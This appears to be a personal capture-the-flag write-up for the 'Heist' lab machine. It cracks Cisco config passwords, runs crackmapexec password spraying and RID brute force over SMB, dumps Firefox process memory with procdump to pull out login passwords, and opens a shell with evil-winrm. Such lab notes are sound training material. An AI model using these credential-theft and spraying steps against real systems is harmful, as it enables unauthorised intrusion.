# Heist
10.10.10.149

there is a webserver on port 80. We are able to login as guest. We see an issue by an enduser who has attached their Cisco iOS config.

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

```

There are a few passwords in this file:

secret
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```
rout3r password
```
0242114B0E143F015F5D1E161713
```
admin password
```
02375012182C1A1D751618034F36415408
```

We found an online crack tool: https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html

and are able to crack the second two passwords

secret
```
stealth1agent
```

rout3r
```
$uperP@ssword
```

admin
```
Q4)sJu\Y8qz*A3?d
```

We used `crackmapexec` to find a valid set of credentials:

```
crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent
```

hazard has the same password as the secret from the config.

we used crackmapexec to RID Bruteforce a few other users.

Then added the users to users.txt and password spray again.

We found another set of credentials `Chase:Q4)sJu\Y8qz*A3?d`

This is where we turned to a writeup for some pointers:
1. Use procdump to dump firefox.
2. Copy the file down
3. Strings dump-file | grep login_password
4. Now we have the admin password.

![[Pasted image 20220718090540.png]]

```
admin@support.htb
```

```
4dD!5}x/re8]FBuZ
```

Then we use crackmapexec to password spray the newly found password against our list of users obtained from the RID bruteforce. 

```
crackmapexec smb 10.10.10.149 -u users -p '4dD!5}x/re8]FBuZ'
```

This is the admin password! And we can execute commands

![[Pasted image 20220718091940.png]]

then we spawn a shell using evil-winrm

![[Pasted image 20220718092124.png]]